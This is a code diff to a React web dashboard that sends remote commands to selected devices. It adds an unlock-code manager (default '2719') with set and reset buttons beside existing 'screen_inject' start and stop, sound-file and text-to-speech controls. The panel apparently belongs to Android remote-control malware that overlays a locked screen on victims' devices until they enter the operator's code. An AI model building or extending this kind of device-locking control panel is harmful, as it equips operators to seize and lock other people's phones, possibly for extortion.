@@ -88,6 +88,8 @@ export default function Dashboard() {
   const [isInjecting, setIsInjecting]   = useState(false)
   const [soundFile, setSoundFile]       = useState<File | null>(null)
   const [ttsSpeed, setTtsSpeed]           = useState(0.60)
+  const [unlockCodeInput, setUnlockCodeInput] = useState('')
+  const [currentCode, setCurrentCode]         = useState('2719')
   const audioRef                        = useRef<HTMLAudioElement | null>(null)
 
   const swrKey = selectedId ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}` : null
@@ -164,6 +166,29 @@ export default function Dashboard() {
         body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_stop' }),
       })
     } catch (_) {}
+  }
+
+  const handleSetCode = async () => {
+    const code = unlockCodeInput.trim()
+    if (!code || !selectedId) return
+    await fetch('/api/device/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_set_code:${code}` }),
+    })
+    setCurrentCode(code)
+    setUnlockCodeInput('')
+  }
+
+  const handleResetCode = async () => {
+    if (!selectedId) return
+    await fetch('/api/device/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_reset_code' }),
+    })
+    setCurrentCode('2719')
+    setUnlockCodeInput('')
   }
 
   const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
@@ -584,6 +609,35 @@ export default function Dashboard() {
                     onChange={e => setSoundFile(e.target.files?.[0] ?? null)}
                   />
                 </label>
+                {/* Unlock Code Manager */}
+                <div className="bg-android-bg border border-android-green/20 rounded-lg p-3 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <span className="text-[10px] font-mono text-android-green/70 tracking-widest uppercase">Unlock Code</span>
+                    <span className="text-[10px] font-mono text-android-green/50">
+                      current: <span className="text-android-green font-bold">{currentCode}</span>
+                    </span>
+                  </div>
+                  <div className="flex gap-2">
+                    <input
+                      value={unlockCodeInput}
+                      onChange={e => setUnlockCodeInput(e.target.value.replace(/[^a-zA-Z0-9]/g,'').slice(0,12))}
+                      onKeyDown={e => { if (e.key === 'Enter') handleSetCode() }}
+                      placeholder="New code (2–12 chars)"
+                      className="flex-1 min-w-0 bg-android-surface border border-android-green/30 rounded px-2.5 py-1.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/60"
+                    />
+                    <button
+                      onClick={handleSetCode}
+                      disabled={!unlockCodeInput.trim() || ctrlBusy}
+                      className="px-3 py-1.5 rounded text-xs font-mono font-bold bg-android-green/10 border border-android-green/40 text-android-green hover:bg-android-green/20 disabled:opacity-40 transition-colors shrink-0"
+                    >SET</button>
+                    <button
+                      onClick={handleResetCode}
+                      disabled={ctrlBusy}
+                      className="px-3 py-1.5 rounded text-xs font-mono bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20 disabled:opacity-40 transition-colors shrink-0"
+                    >RST</button>
+                  </div>
+                </div>
+
                 {/* Inject / Stop */}
                 <div className="grid grid-cols-2 gap-2">
                   <button
